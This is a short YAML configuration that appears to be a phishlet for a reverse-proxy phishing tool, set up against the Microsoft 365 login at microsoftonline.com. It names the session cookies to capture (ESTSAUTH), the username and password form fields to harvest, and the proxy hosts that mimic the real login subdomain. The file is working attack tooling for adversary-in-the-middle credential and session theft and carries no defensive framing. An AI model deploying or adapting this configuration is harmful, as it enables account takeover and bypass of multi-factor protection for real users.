name: o365
auth_urls:
  - /common/oauth2/v2.0/authorize
  - /common/oauth2/v2.0/token
auth_tokens:
  - ESTSAUTH
  - cL
credentials:
  username: loginfmt
  password: passwd
proxy_hosts:
  - phish_sub: login
    orig_sub: login
    domain: microsoftonline.com
    session: true
sub_filters:
  - triggers_on: login.microsoft.com
    orig_sub: login.microsoft.com
    domain: localhost
    session: true
